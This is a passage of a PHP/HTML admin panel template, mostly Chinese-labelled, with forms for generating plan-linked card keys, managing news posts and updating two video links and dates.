                                        <div class="col-md-4"><strong>卡密张数:</strong></div>
                                        <div class="col-md-8"><input type="number" class="form-control" name="number" placeholder="要生成的卡密张数" data-original-title="要生成的卡密张数"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>套餐:</strong></div>
                                        <div class="col-md-8">
                                            <select name="plansid" class="form-control">
                                                    <?php
                                                    $SQLSelect = $odb -> query("SELECT * FROM `plans` ORDER BY `price` ASC");
                                                    while ($show = $SQLSelect -> fetch(PDO::FETCH_ASSOC))
                                                    {
                                                        $unit = $show['name'];
                                                        $id = $show['ID'];
                                                        echo '<option value="'.$id.'">'.htmlspecialchars($unit).'</option>';
                                                    }
                                                    ?>
                                            </select>
                                        </div>
                                    </div>
                                    <button name="addkami" class="btn btn-success">提交</button>
                                    </form>
                                </div>
</p>
                                        </div>                    
                                    </div>
                                </div>
</div>
</div>
</div>
<!-- 卡密什么 -->


















 <div class="row page-toolbar-tab" id="page-tab-4">					
<div class="row">
<div class="col-md-10">
                                <div class="block">
                                    <ul class="nav nav-tabs nav-justified">
                                        <li class="active"><a href="#tab3" data-toggle="tab">查看资讯</a></li>
                                        <li><a href="#tab4" data-toggle="tab">发布资讯</a></li>
                                    </ul>
                                    <div class="block-content tab-content">
                                        <div class="tab-pane active" id="tab3">
<p>
                                    <table class="table table-striped">
                                        <tr>
                    <th>标题</th>
                    <th>日期</th>
                    <th>删除</th>
                  </tr>
                </thead>
                <tbody>
				<form method="post">
			<?php 
			$SQLGetNews = $odb -> query("SELECT * FROM `news` ORDER BY `date` DESC");
			while ($getInfo = $SQLGetNews -> fetch(PDO::FETCH_ASSOC))
			{
				$id = $getInfo['ID'];
				$title = $getInfo['title'];
				$date = date("m-d-Y, h:i:s a" ,$getInfo['date']);
				echo '<tr><td>'.htmlspecialchars($title).'</td><td>'.$date.'</td><td><button name="deletenews" value="'.$id.'"class="btn btn-danger"><i class="fa fa-trash-o"></i></button></td></tr>';
			}
			?>
</form>
                                        </tr>                                       
                                    </table>
</p>
                                        </div>
                                        <div class="tab-pane" id="tab4">
<p>
                                <div class="block-content controls">
								<form method="post">
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>标题:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" name="title"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>内容:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" name="content"/></div>
                                    </div>
							 <div class="row-form">
                                        <div class="col-md-8"><input type="hidden" class="form-control" name="author" value="<?php echo $_SESSION['username']; ?>" /></div>
                                    </div>
									<button name="addnews" class="btn btn-success">发布</button>
									</form>
                                </div>
</p>
                                        </div>                    
                                    </div>
                                </div>
</div>
</div>
</div>


 <div class="row page-toolbar-tab" id="page-tab-6">					
                    <div class="row">
				  <div class="block">
				  
                        <div class="col-md-3">
						<div class="block-content controls">
						<form method="post">
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>Video1:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" value="<?php echo $video1; ?>" name="video1"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>Date1:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" value="<?php echo $date1; ?>" name="date1"/></div>
                                    </div>
							<button name="video1xD" class="btn btn-success">Update</button>
						</form>
					</div></div>
					<div class="col-md-3">
						<div class="block-content controls">
						<form method="post">
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>Video2:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" value="<?php echo $video2; ?>" name="video2"/></div>
                                    </div>
                                    <div class="row-form">
                                        <div class="col-md-4"><strong>Date2:</strong></div>
                                        <div class="col-md-8"><input type="text" class="form-control" value="<?php echo $date2; ?>"	name="date2"/></div>
                                    </div>
							<button name="video2xD" class="btn btn-success">Update</button>
						</form>
					</div></div>
				</div></div>
			</div>
                    
                </div>
                
            </div>
            <div class="page-sidebar"></div>
        </div>
    </body>
</html>